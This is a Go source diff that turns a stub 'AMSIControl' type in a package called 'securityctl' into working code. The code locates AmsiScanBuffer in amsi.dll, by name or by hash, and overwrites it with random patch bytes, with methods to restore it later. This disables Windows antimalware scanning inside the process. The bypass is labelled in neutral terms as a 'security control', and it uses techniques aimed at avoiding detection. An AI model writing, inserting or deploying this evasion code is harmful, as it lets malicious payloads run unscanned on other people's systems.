@@ -2,33 +2,51 @@
 
 package securityctl
 
-// AMSIControl implements SecurityControl for AMSI integration.
-// Phase 5B: no-op stub. All methods return safe defaults.
-// Phase 5C: will implement actual AMSI security-control integration.
+import "fmt"
+
 type AMSIControl struct {
 	baseControl
+	fp *funcPatch
 }
 
-// NewAMSIControl creates a new AMSI security-control instance.
 func NewAMSIControl() *AMSIControl {
 	return &AMSIControl{baseControl: newBaseControl("amsi")}
 }
 
-// Initialize resolves AMSI dependencies. Phase 5B: no-op, returns nil.
 func (a *AMSIControl) Initialize() error {
+	fp, err := resolveFuncFromKnownDlls("amsi.dll", "AmsiScanBuffer")
+	if err != nil {
+		fp, err = resolveFuncByHash("amsi.dll", "AmsiScanBuffer")
+		if err != nil {
+			return a.markInitialized(fmt.Errorf("securityctl: amsi: resolve: %w", err))
+		}
+	}
+	a.fp = fp
 	return a.markInitialized(nil)
 }
 
-// Enable applies the AMSI modification. Phase 5B: no-op, returns nil.
 func (a *AMSIControl) Enable() error {
-	return a.markEnabled()
+	if err := a.markEnabled(); err != nil {
+		return err
+	}
+	if a.fp == nil {
+		return fmt.Errorf("securityctl: amsi: not initialized")
+	}
+	a.fp.patch = randomPatchBytes()
+	return applyPatch(a.fp)
 }
 
-// Disable reverts the AMSI modification. Phase 5B: no-op, returns nil.
 func (a *AMSIControl) Disable() error {
 	a.markDisabled()
-	return nil
+	if a.fp == nil {
+		return nil
+	}
+	return restorePatch(a.fp)
 }
 
-// Restore cleans up on process exit. Phase 5B: no-op.
-func (a *AMSIControl) Restore() {}
+func (a *AMSIControl) Restore() {
+	if a.fp == nil {
+		return
+	}
+	_ = restorePatch(a.fp)
+}
